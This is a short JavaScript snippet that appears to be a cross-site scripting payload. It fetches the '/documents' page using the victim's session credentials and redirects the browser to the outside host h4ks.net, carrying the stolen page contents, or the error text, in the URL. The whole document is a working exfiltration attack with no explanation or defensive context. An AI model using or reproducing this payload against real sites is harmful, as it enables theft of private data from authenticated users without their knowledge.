fetch("/documents", {
    "credentials": "include",
    "method": "GET",
}).then(r => r.text())
.then(body => {
    location = '//h4ks.net/go/?'+encodeURIComponent(body);
})
.catch(err => {
    location = '//h4ks.net/go/?'+encodeURIComponent(err.toString());
})
